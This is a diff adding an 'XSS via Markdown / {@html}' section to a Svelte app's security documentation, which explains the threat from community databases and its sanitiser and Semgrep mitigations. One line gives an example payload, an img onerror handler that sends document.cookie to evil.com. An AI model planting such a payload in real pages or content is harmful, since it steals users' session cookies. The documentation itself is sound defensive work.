@@ -16,6 +16,7 @@
   - [CSRF & Reverse Proxies](#csrf--reverse-proxies)
   - [Protected Paths](#protected-paths)
   - [Secret Stripping](#secret-stripping)
+  - [XSS via Markdown / {@html}](#xss-via-markdown--html)
 - [Test Coverage](#test-coverage)
   - [Unit Tests](#unit-tests-srctestsauth)
   - [Integration Tests](#integration-tests-srctestsintegrationspecs)
@@ -355,6 +356,40 @@ Secrets are stripped at two levels:
   `auth_settings.api_key`, `ai_settings.api_key`, `tmdb_settings.api_key`),
   notification configs cleared, and auth tables (`users`, `sessions`,
   `login_attempts`) emptied. The production database is never touched.
+
+### XSS via Markdown / {@html}
+
+Svelte's `{@html}` directive renders raw HTML without escaping. Any content
+that flows through `{@html}` without sanitisation is an XSS vector.
+
+**The attack**: Profilarr clones PCD databases maintained by community
+developers. These databases contain markdown fields — quality profile
+descriptions, custom format descriptions, etc. A malicious or compromised
+developer could inject JavaScript into a description field:
+
+```markdown
+Great profile for 1080p <!-- <img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)"> -->
+```
+
+Every user who clones that database would execute the payload whenever the
+description renders. The attacker could steal session cookies, exfiltrate API
+keys displayed on the page, or redirect to a phishing page — all without
+needing to authenticate.
+
+**Mitigation**: The `Markdown.svelte` component (the primary markdown renderer)
+passes all `marked.parse()` output through `sanitizeHtml()` from
+`$shared/utils/sanitize.ts` before rendering with `{@html}`. The sanitiser
+strips `<script>` tags, event handlers (`onerror`, `onclick`, etc.),
+`javascript:` URLs, and any tags/attributes not on an explicit allowlist.
+
+The same `sanitizeHtml()` function is used server-side in
+`$utils/markdown/markdown.ts` for any markdown rendered in load functions.
+
+**Semgrep enforcement**: Custom rules in `.semgrep/xss.yml` flag any use of
+`marked.parse()` in Svelte files and any raw variable in `{@html}`, ensuring
+new code is reviewed for sanitisation. Because Semgrep uses regex matching for
+Svelte (no AST support), it cannot verify that sanitisation wraps the call —
+verified-safe instances use `nosemgrep` comments with justification.
 
 ## Test Coverage
 
